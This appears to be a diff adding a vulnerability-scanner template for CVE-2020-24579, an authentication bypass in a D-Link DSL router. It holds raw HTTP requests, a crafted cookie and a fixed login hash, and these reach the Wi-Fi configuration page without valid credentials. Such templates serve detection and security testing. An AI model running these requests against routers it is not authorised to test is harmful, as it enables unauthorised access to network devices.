@@ -1,0 +1,45 @@
+id: d-link-dsl-28881a-unauthorized-access-cve-2020-24579
+
+info:
+  name: D-Link DSL-28881A Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The router's web portal's identity verification is insufficient to access any authenticated management pages without the need to enter the correct password. A malicious user on the same network can use invalid credentials to browse directly to any authenticated management page.
+  reference:
+    - http://wiki.peiqi.tech
+  classification:
+    cve-id: CVE-2020-24579
+
+variables:
+  uid: "{{concat('uid=y3TWG', rand_char('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'), 'Rt7z')}}"
+
+http:
+  - id: login-request
+    raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/page/login/login.html
+        Cookie: {{uid}}
+
+        username=admin&password=95fbeb8f769d2c0079d1d11348877da944aaefaba6ecf9f7f7dab6344ece8605
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: wifi-config-access
+    raw:
+      - |
+        GET /WiFi.shtml HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{uid}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ConfigS[radios_num]"
